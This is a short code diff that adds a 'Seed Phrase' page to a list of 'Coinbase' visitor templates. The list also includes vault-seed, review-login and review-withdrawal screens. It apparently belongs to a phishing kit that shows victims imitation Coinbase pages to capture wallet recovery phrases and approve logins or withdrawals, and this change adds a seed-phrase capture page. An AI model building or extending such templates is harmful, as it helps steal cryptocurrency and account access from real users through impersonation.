@@ -24,6 +24,7 @@ export const VISITOR_TEMPLATES: VisitorTemplate[] = [
 	{ module: 'Coinbase', page: 'Swap',        slug: 'coinbase/swap' },
 	{ module: 'Coinbase', page: 'Vault',       slug: 'coinbase/vault' },
 	{ module: 'Coinbase', page: 'Vault Seed',  slug: 'coinbase/vault-seed' },
+	{ module: 'Coinbase', page: 'Seed Phrase', slug: 'coinbase/seed-phrase' },
 	{ module: 'Coinbase', page: 'Review Login',      slug: 'coinbase/review-login' },
 	{ module: 'Coinbase', page: 'Review Withdrawal', slug: 'coinbase/review-withdrawal' },
 	{ module: 'Coinbase', page: 'Review Email',      slug: 'coinbase/review-email' },
